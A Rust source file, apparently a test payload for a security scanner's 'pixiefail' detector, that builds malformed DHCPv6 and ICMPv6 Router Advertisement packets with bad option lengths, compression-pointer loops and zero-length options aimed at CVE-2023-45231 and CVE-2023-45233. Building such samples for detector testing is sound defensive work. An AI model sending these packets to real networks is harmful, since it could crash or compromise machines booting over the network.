use anyhow::Result;

use crate::{Arch, ExpectedFinding, Payload, PayloadConfig};
use barzakh_core::Severity;

pub struct PixiefailDhcpPayload;

impl Payload for PixiefailDhcpPayload {
    fn name(&self) -> &str {
        "pixiefail_dhcp"
    }

    fn arch(&self) -> Arch {
        Arch::X86_64
    }

    fn generate(&self, config: &PayloadConfig) -> Result<Vec<u8>> {
        let size = config.size.max(0x2000);
        let mut data = vec![0u8; size];

        // DHCPv6 Advertise message (type 2)
        let offset = 0x000;
        data[offset] = 0x02; // msg-type: Advertise
        data[offset + 1] = 0x12; // transaction-id (3 bytes)
        data[offset + 2] = 0x34;
        data[offset + 3] = 0x56;

        // Option: DNS Recursive Name Server (option 23)
        // with length NOT multiple of 16 (triggers CVE-2023-45231)
        let opt_offset = offset + 4;
        data[opt_offset] = 0x00;
        data[opt_offset + 1] = 23; // OPTION_DNS_SERVERS
                                   // Option length = 25 (not multiple of 16 — malformed)
        data[opt_offset + 2] = 0x00;
        data[opt_offset + 3] = 25;
        // Partial IPv6 address data (triggers OOB read)
        for i in 0..25 {
            data[opt_offset + 4 + i] = (0xFE + i) as u8;
        }

        // Option: Domain Search List (option 24) with DNS compression loop
        let opt2_offset = opt_offset + 4 + 25;
        data[opt2_offset] = 0x00;
        data[opt2_offset + 1] = 24; // OPTION_DOMAIN_LIST
        data[opt2_offset + 2] = 0x00;
        data[opt2_offset + 3] = 16; // length
                                    // DNS compression pointer loop: pointer at position 0 -> position 0
        data[opt2_offset + 4] = 0xC0; // Compression flag (0xC0 = pointer)
        data[opt2_offset + 5] = 0x00; // Points back to offset 0 (infinite loop)
                                      // More compression pointers to strengthen detection
        data[opt2_offset + 6] = 0xC0;
        data[opt2_offset + 7] = 0x00;
        data[opt2_offset + 8] = 0xC0;
        data[opt2_offset + 9] = 0x04;
        data[opt2_offset + 10] = 0xC0;
        data[opt2_offset + 11] = 0x06;

        // Option: Preference (option 7) — a recognized RFC 8415 option that
        // keeps the packet structurally realistic (servers send it in
        // Advertise messages).
        let pref_offset = opt2_offset + 4 + 16;
        data[pref_offset] = 0x00;
        data[pref_offset + 1] = 7; // OPTION_PREFERENCE
        data[pref_offset + 2] = 0x00;
        data[pref_offset + 3] = 1; // length
        data[pref_offset + 4] = 0xFF; // preference value

        // Option: Boot File URL (option 59) with oversized length
        let opt3_offset = pref_offset + 4 + 1;
        data[opt3_offset] = 0x00;
        data[opt3_offset + 1] = 59; // OPTION_BOOTFILE_URL
                                    // Declare length that exceeds packet (buffer overflow trigger)
        data[opt3_offset + 2] = 0x08; // option-len high byte = 0x0800 = 2048
        data[opt3_offset + 3] = 0x00;

        // Second DHCPv6 message: Reply with overflowing option length
        let msg2_offset = 0x200;
        data[msg2_offset] = 0x07; // msg-type: Reply
        data[msg2_offset + 1] = 0xAB;
        data[msg2_offset + 2] = 0xCD;
        data[msg2_offset + 3] = 0xEF;
        // Option with length exceeding remaining data
        let opt4_offset = msg2_offset + 4;
        data[opt4_offset] = 0x00;
        data[opt4_offset + 1] = 0x01; // Client ID option
                                      // Length = 0xFFFF (far exceeds remaining data)
        data[opt4_offset + 2] = 0xFF;
        data[opt4_offset + 3] = 0xFF;

        // IPv6 Router Advertisement with zero-length option (CVE-2023-45233)
        let ra_offset = 0x400;
        data[ra_offset] = 134; // ICMPv6 type: Router Advertisement
        data[ra_offset + 1] = 0; // Code
                                 // Checksum (2 bytes), unused
                                 // Cur Hop Limit, Flags, Router Lifetime, Reachable Time, Retrans Timer (12 bytes)
        data[ra_offset + 4] = 64; // Hop limit
                                  // Option area starts at ra_offset + 16
        data[ra_offset + 16] = 0x01; // Option type: Source Link-Layer Address
        data[ra_offset + 17] = 0x00; // Length = 0 (zero-length! triggers infinite loop)

        Ok(data)
    }

    fn expected_detections(&self) -> Vec<ExpectedFinding> {
        vec![ExpectedFinding {
            detector: "pixiefail".to_string(),
            min_severity: Severity::High,
        }]
    }
}
